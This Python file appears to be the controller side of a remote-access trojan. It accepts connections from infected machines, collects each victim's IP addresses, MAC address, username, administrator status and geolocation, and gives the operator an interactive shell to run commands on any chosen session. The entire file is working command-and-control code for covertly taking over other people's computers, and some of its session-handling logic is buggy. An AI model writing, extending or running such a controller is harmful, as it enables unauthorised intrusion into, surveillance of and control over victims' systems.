import socket
import os
import time
from _thread import *

ServerSocket = socket.socket()
host = '127.0.0.1'
port = 1233
ThreadCount = 0
try:
    ServerSocket.bind((host, port))
except socket.error as e:
    print(str(e))

BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase

print('Waitiing for a Connection..')
ServerSocket.listen(5)

## Pour dans les fonction

current_sessions = 0
lcmd = ""
SEPARATOR = "<sep>"
test = ""
local = True


image = "\n\tooooooooooooo      oooooooooo.       ooooo      ooo      oooooooooooo      ooooooooooooo \n\
\t8'   888   `8      `888'   `Y8b      `888b.      8        888       8      8    888    8 \n\
\t     888            888     888       8 `88b.    8        888                   888      \n\
\t     888            888oooo888'       8   `88b.  8        888oooo8              888      \n\
\t     888            888    `88b       8     `88b.8        888                   888      \n\
\t     888            888    .88P       8       `888        888       o           888      \n\
\t    o888o          o888bood8P'       o8o        `8       o888ooooood8          o888o \n"


print(image)


def threaded_client(connection, id_conn):
    global test
    pwd = connection.recv(BUFFER_SIZE).decode('utf-8')
    print("[+] Current working directory:", pwd)
    infos = connection.recv(BUFFER_SIZE).decode('utf-8')
    platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation, ipv4  = infos.split(SEPARATOR)


    print("\t Platforme : " + platform + "\n\t Ip Public : " + public_ip + "\n\t Ip Local : " + local_ip + "\n\t Adresse Mac : " + mac_address + "\n\t Architecture : " + architecture + "\n\t Device : " + device + "\n\t Username : " + username + "\n\t Administrator : " + administrator+ "\n\t Geolocation : " + geolocation+ "\n\t Ipv4 : " + ipv4)

        
    while True:
        if "shell" in test:
            if str(id_conn) in test:
                global current_sessions
                current_sessions = id_conn
                print("prise en main de la sessions " + str(id_conn) + "\n")
                while True:
                    if current_sessions == id_conn:
                        cmd = input(f"{str(id_conn)} : {pwd} $> ")
                        if cmd != "":
                            #print("pas egale a rien")
                            print(cmd)
                            if "exit" in cmd:
                                global local
                                local = True
                                
                                test = ""
                                current_sessions = 0
                                print(str(local) + str(current_sessions) + test)
                                print("Fermeture de la session : " + str(id_conn))
                                break
                            else:
                                connection.sendall(str.encode(cmd))
                                output = connection.recv(BUFFER_SIZE).decode('utf-8')
                                results, pwd = output.split(SEPARATOR)
                                print(results)
                        #else:
                            ##print("egale a rien")

                            

        #data = connection.recv(2048)
        #reply = 'Server Says: ' + test + " " + data.decode('utf-8')
        #if not data:
            #break
        #connection.sendall(str.encode(reply))
        #print("fin de boucle")
    connection.close()

def prompt():
    global local
    local = True
    global test
    test = ""
    while True:
        if local == True:
            if current_sessions == 0:  
                lcmd = input("local : ")
                #print(lcmd + " local")
                test = lcmd
                lcmd = ""
                print(test)
                if "shell" in lcmd:
                    test = ""
                    lcmd = ""
                    local = False
                if "exit" in lcmd:
                    break
                    
start_new_thread(prompt, ())
while True:
    Client, address = ServerSocket.accept()
    print('Connected to: ' + address[0] + ':' + str(address[1]) + "\n")
    ThreadCount += 1
    start_new_thread(threaded_client, (Client, ThreadCount))
    print('Thread Number: ' + str(ThreadCount))
ServerSocket.close()
